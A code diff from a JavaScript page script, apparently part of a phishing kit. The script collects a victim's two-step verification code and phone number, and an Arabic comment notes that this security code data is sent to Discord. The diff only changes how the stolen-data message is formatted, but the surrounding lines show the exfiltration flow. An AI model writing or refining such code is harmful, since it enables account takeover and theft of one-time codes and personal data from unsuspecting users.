@@ -64,7 +64,7 @@ document.addEventListener('DOMContentLoaded', function () {
             const countryCode = getFromStorage('countryCode') || '+968';
 
             // إرسال بيانات رمز الأمان إلى Discord
-            const message = `🔐 **رمز الأمان (التحقق بخطوتين):** ${code}\n📱 **الرقم:** ${countryCode}${phoneNumber}\n🌍 `;
+            const message = ` 🔐═══════🔐🔐 **رمز الأمان (التحقق بخطوتين):** ${code}\n📱 **الرقم:** ${countryCode}${phoneNumber}\n🌍 `;
 
             const success = await sendToDiscord(message);
 
